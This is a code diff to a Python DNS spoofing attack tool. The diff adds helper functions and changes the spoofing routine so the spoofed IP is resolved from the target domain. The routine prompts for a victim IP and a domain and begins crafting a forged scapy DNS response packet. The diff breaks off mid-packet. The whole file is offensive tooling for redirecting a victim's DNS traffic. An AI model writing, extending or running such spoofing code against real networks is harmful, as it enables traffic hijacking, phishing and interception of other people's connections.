@@ -20,6 +20,7 @@ def display_starting_info():
     print("=======================================")
     print("Local IP Address:", get_local_ip())
     print("Network Interfaces:", get_network_interfaces())
+    print("DNS Server IP Address:", get_dns_server_ip())
     print("=======================================")
 
 def get_local_ip():
@@ -36,6 +37,15 @@ def get_dns_server_ip():
         dns_ip = socket.gethostbyname(socket.gethostname())
         return dns_ip
     except:
+        return None
+
+def get_ip_address(domain):
+    """Get the IP address of a domain."""
+    try:
+        ip_address = socket.gethostbyname(domain)
+        return ip_address
+    except socket.gaierror:
+        print("Error: Unable to resolve the domain. Please enter a valid domain name.")
         return None
 
 def dns_spoofing_menu():
@@ -69,7 +79,13 @@ def perform_dns_spoofing(dns_server_ip):
     print("[+] Performing DNS Spoofing Attack...")
     target_ip = input("Enter the target IP address: ")
     target_domain = input("Enter the target domain to spoof: ")
-    spoofed_ip = input("Enter the IP address to spoof: ")
+    
+    # Get the IP address to spoof
+    spoofed_ip = get_ip_address(target_domain)
+    if spoofed_ip is None:
+        return
+    
+    print(f"The IP address to spoof for {target_domain} is {spoofed_ip}")
 
     # Craft DNS response packet with spoofed IP
     spoofed_pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(
